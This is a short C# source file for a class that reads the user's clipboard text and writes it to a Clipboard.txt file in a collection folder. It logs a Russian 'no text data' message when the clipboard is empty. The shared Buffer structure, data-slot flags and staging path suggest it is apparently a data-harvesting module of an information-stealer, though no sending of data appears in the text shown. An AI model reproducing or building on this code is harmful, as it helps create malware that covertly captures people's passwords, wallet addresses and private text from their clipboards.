using System.IO;
using System.Windows.Forms;

internal class CBoard
{
	public static void Start()
	{
		string text = Clipboard.GetText();
		if (!string.IsNullOrEmpty(text.Trim()))
		{
			Buffer.XBufferData[8] = "1";
		}
		else
		{
			Buffer.XBufferData[8] = "0";
		}
		File.WriteAllText($"{Buffer.path_l}Clipboard.txt", (Buffer.XBufferData[8] == "1") ? text : $"{Buffer.head}Буфер обмена не содержит текстовые данные.");
	}
}
